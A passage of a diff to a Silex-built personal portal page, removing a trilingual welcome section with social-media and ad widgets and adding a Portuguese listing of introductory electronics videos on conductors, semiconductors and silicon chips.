-            <div data-silex-type="text" class="editable-style text-element silex-id-1518470041203-5 page-redes paged-element" data-silex-id="silex-id-1518470041203-5" style="" data-silex-href="#!page-redes">
-                <div class="silex-element-content normal">
-                    <font size="5"></font>
-                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Visite minhas redes.</span></b>
-
+                    </h2><span style="font-family: Roboto;">
+                    </span>
+                    <span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);">
+                    </span>
+                        </font>
                         </span>
-                    </font>
-                    <font size="5">
-                    </font>
-                    <h1>
-                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
-                    </h1>
-                    <font size="5">
-                    </font>
-                </div>
-            </div>
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518470111805-6 page-redes paged-element page-scrapbook" data-silex-id="silex-id-1518470111805-6" style="" data-silex-href="#!page-br">
-                <div class="silex-element-content normal">
-                    <font size="5"><span style="font-family: courier new,monospace;"><b><span style="color: rgb(11, 83, 148);" class="heading1">Voltar ao Portal.</span></b>
-
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"></span>
+                        </font>
                         </span>
-                    </font>
-                    <font size="5">
-                    </font>
-                    <h1>
-                        <font size="5"><b><span style="color: rgb(11, 83, 148);"></span></b></font>
-                    </h1>
-                    <font size="5">
-                    </font>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1474394621033-3 section-element paged-element page-es page-en page-br" data-silex-id="silex-id-1474394621033-3" style="">
-        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1474394621032-2 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1474394621032-2">
-            <div data-silex-type="text" class="editable-style silex-id-1518112395580-3 text-element page-en paged-element" data-silex-id="silex-id-1518112395580-3" style="">
-                <div class="silex-element-content normal">
-                    <div style="text-align: center;"><b>Welcome to the a1000ton.com.br portal!</b></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">A portal of Arts and Technology.<br></span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">To see ARTS, click the icon with ink.</span></span>
-                    </div>
-                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">To see TECHNOLOGY, click the icon with lights.</span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">To visit my SOCIAL WALL,</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">click the icon with bricks.</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">To help me with GOLD,</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">click the icon with coins.</span><br></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><i>The author is grateful for your visit!</i></div>
-                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span>
-                    </div>
-                </div>
-            </div>
-
-            <div data-silex-type="container" class="editable-style silex-id-1518116903648-0 container-element" data-silex-id="silex-id-1518116903648-0" style="">
-                <div data-silex-type="image" class="editable-style silex-id-1518117941686-4 image-element" data-silex-id="silex-id-1518117941686-4" style="" data-silex-href="ruindows" title="Ruindows Blog"><img src="central/layout/wireframes.gif" class="silex-element-content"></div>
-
-
-
-                <div data-silex-type="image" class="editable-style image-element silex-id-1518116972654-2" data-silex-id="silex-id-1518116972654-2" style="" data-silex-href="hq" title="Quadrinhos"><img src="central/layout/tinta_girando.gif" class="silex-element-content"></div>
-
-
-                <div data-silex-type="image" class="editable-style silex-id-1518116929404-1 image-element" data-silex-id="silex-id-1518116929404-1" style="" title="Mina de Ouro" data-silex-href="mina-de-ouro"><img src="central/layout/mario_money.gif" class="silex-element-content"></div>
-                <div data-silex-type="image" class="editable-style silex-id-1518118022345-5 image-element page-link-active" data-silex-id="silex-id-1518118022345-5" style="" data-silex-href="#!page-redes" title="Muro Social"><img src="central/layout/the_wall.jpg" class="silex-element-content"></div>
-            </div>
-            <div data-silex-type="container" class="editable-style silex-id-1518214998514-4 container-element" data-silex-id="silex-id-1518214998514-4" style="">
-                <div data-silex-type="image" class="editable-style silex-id-1518214904249-2 image-element" data-silex-id="silex-id-1518214904249-2" style="" data-silex-href="#!page-br"><img src="central/layout/br.png" class="silex-element-content"></div>
-                <div data-silex-type="image" class="editable-style silex-id-1518214942943-3 image-element" data-silex-id="silex-id-1518214942943-3" style="" data-silex-href="#!page-es"><img src="central/layout/cl.png" class="silex-element-content"></div>
-                <div data-silex-type="image" class="editable-style silex-id-1518215062791-5 image-element" data-silex-id="silex-id-1518215062791-5" style="" data-silex-href="#!page-en"><img src="central/layout/um.png" class="silex-element-content"></div>
-                <div data-silex-type="text" class="editable-style silex-id-1518215099148-6 text-element" data-silex-id="silex-id-1518215099148-6" style="" data-silex-href="#!page-br">
-                    <div class="silex-element-content normal">PT_Br</div>
-                </div>
-                <div data-silex-type="text" class="editable-style text-element silex-id-1518215131628-7" data-silex-id="silex-id-1518215131628-7" style="" data-silex-href="#!page-es">
-                    <div class="silex-element-content normal">Español<br></div>
-                </div>
-                <div data-silex-type="text" class="editable-style text-element silex-id-1518215138674-8" data-silex-id="silex-id-1518215138674-8" style="" data-silex-href="#!page-en">
-                    <div class="silex-element-content normal">English</div>
-                </div>
-            </div>
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518215573209-9 paged-element page-es" data-silex-id="silex-id-1518215573209-9" style="">
-                <div class="silex-element-content normal">
-                    <div style="text-align: center;"><b>Bienvenido al portal a1000ton.com.br!</b></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">Un portal de Artes y Tecnología.<br></span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">Para ver ARTES, clic el icono con tinta.</span></span>
-                    </div>
-                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">Para ver TECNOLOGÍA, clic el icono con luces.</span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">Para visitar mi MURAL SOCIAL,</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">clic el icono con ladrillos.</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">Para ayudarme con ORO,</span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">clic el icono con monedas.</span><br></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><i>¡El autor agradece demasiado su visita!</i></div>
-                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span><br></div>
-                </div>
-            </div>
-            <div data-silex-type="text" class="editable-style text-element silex-id-1518221451690-0 paged-element page-br" data-silex-id="silex-id-1518221451690-0" style="">
-                <div class="silex-element-content normal">
-                    <div style="text-align: center;"><b>Bem Vindo ao portal a1000ton.com.br!</b></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 255);">Um portal de Artes &amp; Tecnologia.<br></span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 0, 0);"><span style="background-color: rgb(255, 255, 255);">Para ver ARTES, use o ícone com tinta.<span> </span><span></span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);">
+                    </span>
+                        </font>
                         </span>
-                    </div>
-                    <div style="text-align: center;"><span style="background-color: rgb(255, 255, 255);">Para ver TECNOLOGIA, use o ícone com luzinhas.<br></span></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">Para visitar meu MURAL SOCIAL,<br></span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 153, 0);">use o ícone com tijolos.<br></span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">Para me ajudar com OURO,<br></span></div>
-                    <div style="text-align: center;"><span style="color: rgb(255, 255, 0);">use o ícone com moedas.</span><br></div>
-                    <div style="text-align: center;"><br></div>
-                    <div style="text-align: center;"><i>O autor agradece demais sua visita!<br></i></div>
-                    <div style="text-align: right;"><span style="background-color: rgb(224, 102, 102);"><span style="color: rgb(11, 83, 148);"><b><i>- Amilton Cores.</i></b></span></span><br></div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1478366450713-3 section-element paged-element page-es page-en page-br" data-silex-id="silex-id-1478366450713-3" style="">
-        <div data-silex-type="container" class="editable-style silex-element-content silex-id-1478366450713-2 silex-container-content container-element prevent-draggable website-width" data-silex-id="silex-id-1478366450713-2">
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3">Sessão 1. Introdução à Eletrônica.</span></span>
+                        </font>
+                        </span>
+                    </h3>
+                    <h3><span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3"></span>&nbsp;<i><br></i></span>
+                        </font>
+                        </span>
+                    </h3>
+                    <h3 style="text-align: center;"><i><span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3"></span></span></font><font size="2"><span style="color: rgb(0, 0, 0);">Tempo total: 1h e 7 minutos. Idioma: português.</span></font></span></i></h3>
+                    <p><br></p>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 1.</u> “Tudo se Transforma" - Episódio: Condutores Elétricos.</font>
+                        </span></span>
 
-
-
-            <div data-silex-type="html" class="editable-style silex-id-1518127547792-0 html-element" data-silex-id="silex-id-1518127547792-0" style="">
-                <div class="silex-element-content">
-                    <div class="fb-like" data-href="https://www.facebook.com/madrugada1000/" data-layout="standard" data-action="like" data-size="large" data-show-faces="true" data-share="false"></div>
-                </div>
-            </div>
-
-
-
-
-
-
-
-
-
-            <div data-silex-type="html" class="editable-style silex-id-1518129201345-2 html-element" data-silex-id="silex-id-1518129201345-2" style="">
-                <div class="silex-element-content"><iframe data-aa="823653" https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" scrolling="no" style="width:120px; height:60px; border:0px; padding:0;overflow:hidden" allowtransparency="true"
-                        data-silex-iframe-src="//ad.a-ads.com/823653?size=120x60" src=""></iframe></div>
-            </div>
-            <div data-silex-type="html" class="editable-style silex-id-1518130058896-4 html-element" data-silex-id="silex-id-1518130058896-4" style="">
-                <div class="silex-element-content"><iframe id="twitter-widget-0" scrolling="no" allowtransparency="true" class="twitter-follow-button twitter-follow-button-rendered" style="position: static; visibility: visible; width: 123px; height: 20px;" title="Twitter Follow Button"
-                        https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" data-screen-name="triptofano" data-silex-iframe-src="https://platform.twitter.com/widgets/follow_button.36c0c29c73929bf937f4c70adb1a29e4.en.html#dnt=false&amp;id=twitter-widget-0&amp;lang=en&amp;screen_name=triptofano&amp;show_count=false&amp;show_screen_name=true&amp;size=m&amp;time=1518182589173"
-                        src="" frameborder="0"></iframe>
-                    <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
-                </div>
-            </div>
-        </div>
-    </div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518118247005-7 section-element paged-element page-redes" data-silex-id="silex-id-1518118247005-7">
-        <div data-silex-type="container" class="editable-style silex-id-1518118247004-6 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518118247004-6">
-
-
-
-
-
-            <div data-silex-type="html" class="editable-style silex-id-1518469699327-0 html-element" data-silex-id="silex-id-1518469699327-0" style="">
-                <div class="silex-element-content">
-                    <blockquote class="instagram-media" data-instgrm-captioned="" data-instgrm-permalink="https://www.instagram.com/p/BYNs4QRBGdf/" data-instgrm-version="8" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);">
-                        <div style="padding:8px;">
-                            <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50.0% 0; text-align:center; width:100%;">
-                                <div style=" background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAMUExURczMzPf399fX1+bm5mzY9AMAAADiSURBVDjLvZXbEsMgCES5/P8/t9FuRVCRmU73JWlzosgSIIZURCjo/ad+EQJJB4Hv8BFt+IDpQoCx1wjOSBFhh2XssxEIYn3ulI/6MNReE07UIWJEv8UEOWDS88LY97kqyTliJKKtuYBbruAyVh5wOHiXmpi5we58Ek028czwyuQdLKPG1Bkb4NnM+VeAnfHqn1k4+GPT6uGQcvu2h2OVuIf/gWUFyy8OWEpdyZSa3aVCqpVoVvzZZ2VTnn2wU8qzVjDDetO90GSy9mVLqtgYSy231MxrY6I2gGqjrTY0L8fxCxfCBbhWrsYYAAAAAElFTkSuQmCC'); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div>
-                            </div>
-                            <p style=" margin:8px 0 0 0; padding:0 4px;"> <a href="https://www.instagram.com/p/BYNs4QRBGdf/" style=" color:#000; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none; word-wrap:break-word;" target="_blank">"The Legend of Caboclo D'água" #ACAM #monster #hunt #anfibio #chupacabra #et #fenomeno #sobrenatural #misterio #aventura #frog #boat #impressionismo #nature #fishing #cryptozoology</a></p>
-                            <p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;">A post shared by <a href="https://www.instagram.com/amilton.cores/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px;" target="_blank"> Amilton Cores da Madrugada</a>                                (@amilton.cores) on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2017-08-25T10:51:59+00:00">Aug 25, 2017 at 3:51am PDT</time></p>
-                        </div>
-                    </blockquote>
-                    <script async="" defer="" src="//platform.instagram.com/en_US/embeds.js"></script>
-                </div>
-            </div>
-            <div data-silex-type="html" class="editable-style silex-id-1518128342871-1 html-element" data-silex-id="silex-id-1518128342871-1" style="">
-                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" new="" index.htmlhttps:="" trindex.htmlhttps:="" index.htmlsrc="" style="border:none;overflow:hidden" scrolling="no" allowtransparency="true" data-silex-iframe-src="https://www.facebook.com/plugins/page.php?href=https://www.facebook.com/madrugada1000&amp;tabs=timeline,messages&amp;width=340&amp;height=500&amp;small_header=true&amp;adapt_container_width=true&amp;hide_cover=false&amp;show_facepile=true&amp;appId"
-                        src="https://www.facebook.com/plugins/page.php?href=https://www.facebook.com/madrugada1000&amp;tabs=timeline,messages&amp;width=340&amp;height=500&amp;small_header=true&amp;adapt_container_width=true&amp;hide_cover=false&amp;show_facepile=true&amp;appId"
-                        height="500" frameborder="0" width="340"></iframe></div>
-            </div>
-        </div>
-    </div>
-
-
-
-
-
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
-    <iframe allowtransparency="true" id="emb_xcomm" class="embedly-xcomm" src="https://cdn.embedly.com/widgets/xcomm.html#name=platform&amp;sid=5e73b41684ca451897203fce5269c0f8" style="border: medium none; position: absolute; top: -9999em; width: 10px; height: 10px;"
-        frameborder="0"></iframe>
-
-
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
-
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
-    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518214447359-1 section-element paged-element hide-on-mobile page-es page-en page-br" data-silex-id="silex-id-1518214447359-1">
-        <div data-silex-type="container" class="editable-style silex-id-1518214447356-0 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518214447356-0">
-            <div data-silex-type="html" class="editable-style silex-id-1518182593205-0 html-element hide-on-mobile" data-silex-id="silex-id-1518182593205-0" style="" title="Calendario Lunar.">
-                <div class="silex-element-content">
-                    <script type="text/javascript" src="//www.midnightkite.com/mooncalendar.js"></script>
-                </div>
-            </div>
-            <div data-silex-type="html" class="editable-style silex-id-1518216543389-11 html-element" data-silex-id="silex-id-1518216543389-11" style="">
-                <div class="silex-element-content">
-                    <!-- LightWidget WIDGET -->
-                    <script src="//lightwidget.com/widgets/lightwidget.js"></script><iframe https:="" editor.silex.me="" api="" 1.0="" ftp="" exec="" get="" trindex.htmlhttps:="" index.htmlsrc="" scrolling="no" allowtransparency="true" class="lightwidget-widget" style="width: 100%; border: 0; overflow: hidden;"
-                        data-silex-iframe-src="//lightwidget.com/widgets/bea277ccc66e50f38b4932d4bfd0e28c.html" src=""></iframe></div>
-            </div>
-            <div data-silex-type="html" class="editable-style silex-id-1518182949637-1 html-element hide-on-mobile" data-silex-id="silex-id-1518182949637-1" style="" title="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral.">
-                <div class="silex-element-content">
-                    <a href="//vishnuavatars.com/horoscope_for_today.html" target="_blank">
-                        <img src="//vishnuavatars.com/gr_informer.png" style="width:200px;" title="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral." alt="Mapa Atual do Ceu segundo a cultura Vedica ou Sideral.">
+                    </h3>
+                    <a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1">
                     </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo:
+13’52”. Data: 2012.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> PUC - Pontifíca Universidade Católica do Rio de Janeiro. Departamento de
+Química, Coordenação Central de Educação à Distância.</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> eletricidade, condutores, semicondutores, dopagem tipo N e tipo P, supercondutores.<br></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Entenda como a eletricidade é conduzida pelos materiais sólidos. Observe o conceito de dopagem de materiais.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span><br></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 2.</u> "Semicondutores”. - </font>
+                        </span><span style="color: rgb(0, 0, 0);"><font size="2">Coleção Técnica Interativa, Habilitação Eletrônica.
+</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 10'25". Data: 2013.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u>
+</font></span><span style="color: rgb(0, 0, 0);"><font size="2"><span>Centro Estadual de Educação Tecnológica Paula Souza</span>, Governo do Estado de São Paulo.</font>
+                        </span>
+                        </span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> fabricação de semicondutores, história da ciência.</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> <br></font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 3.</u> “Como é feito o chip de silício?”</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>
+</u></font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo:
+9’02” Data: 2008.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u>
+Discovery Channel.</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
